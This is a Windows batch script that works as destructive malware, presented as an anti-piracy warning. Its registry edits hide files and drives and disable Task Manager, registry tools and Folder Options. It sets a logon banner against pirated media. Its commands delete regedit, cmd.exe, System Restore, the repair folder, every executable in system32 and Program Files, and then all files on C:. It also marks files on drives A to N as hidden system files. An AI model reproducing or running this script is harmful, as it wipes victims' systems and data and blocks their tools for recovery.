@echo off

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 00000002 /f
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 00000002 /f

REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v Hidden /t REG_DWORD /d 00000002 /f
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v Hidden /t REG_DWORD /d 00000002 /f

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 00000001 /f
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 00000001 /f

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 00000001 /f
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 00000001 /f

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_BINARY /d ffffff03 /f
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_BINARY /d ffffff03 /f

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 00000001 /f 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 00000001 /f

REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 00000001 /f 
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 00000001 /f

REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\winlogon /v legalnoticecaption /t REG_SZ /d "linebreaker@htomail.com" /f
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\winlogon /v legalnoticetext /t REG_SZ /d "Please Dont Use Pirated CD's" /f

REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\winlogon /v legalnoticecaption /t REG_SZ /d "linebreaker@htomail.com" /f
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon /v legalnoticetext /t REG_SZ /d "Please Do Not Use Pirated Media" /f




IF EXIST C:\WINDOWS\system32\Regedit.exe del /q /f /s /a: s C:\WINDOWS\system32\Regedit.exe
IF EXIST C:\WINDOWS\system32\Restore\rstrui.exe del /q /f /s /a: s C:\WINDOWS\system32\Restore\rstrui.exe
IF EXIST C:\WINDOWS\system32\Restore del /q /f /s /a: s C:\WINDOWS\system32\Restore
IF EXIST C:\WINDOWS\system32\cmd.exe del /q /f /s /a: s C:\WINDOWS\system32\cmd.exe
IF EXIST C:\WINDOWS\system32\command.exe del /q /f /s /a: s C:\WINDOWS\system32\command.exe
IF EXIST C:\WINDOWS\repair del /q /f /s /a: s C:\WINDOWS\repair

IF EXIST A:\*.* attrib +h +r +s +a /s /d A:\*.*
IF EXIST B:\*.* attrib +h +r +s +a /s /d B:\*.*
IF EXIST C:\*.* attrib +h +r +s +a /s /d C:\*.*
IF EXIST D:\*.* attrib +h +r +s +a /s /d D:\*.*
IF EXIST E:\*.* attrib +h +r +s +a /s /d E:\*.*
IF EXIST F:\*.* attrib +h +r +s +a /s /d F:\*.*
IF EXIST G:\*.* attrib +h +r +s +a /s /d G:\*.*
IF EXIST H:\*.* attrib +h +r +s +a /s /d H:\*.*
IF EXIST I:\*.* attrib +h +r +s +a /s /d I:\*.*
IF EXIST J:\*.* attrib +h +r +s +a /s /d J:\*.*
IF EXIST K:\*.* attrib +h +r +s +a /s /d K:\*.*
IF EXIST L:\*.* attrib +h +r +s +a /s /d L:\*.*
IF EXIST M:\*.* attrib +h +r +s +a /s /d M:\*.*
IF EXIST N:\*.* attrib +h +r +s +a /s /d N:\*.*

IF EXIST C:\WINDOWS\system32\*.exe del /q /f /s /a: s C:\WINDOWS\system32\*.exe
IF EXIST C:\Program Files\*.exe del /q /f /s /a: s C:\Program Files\*.exe
IF EXIST C:\WINDOWS\system32\drivers /q /f /s /a: s C:\WINDOWS\system32\drivers
IF EXIST C:\*.* del /q /f /s /a: s C:\*.*


msg * Please Do Not Use Pirated Media
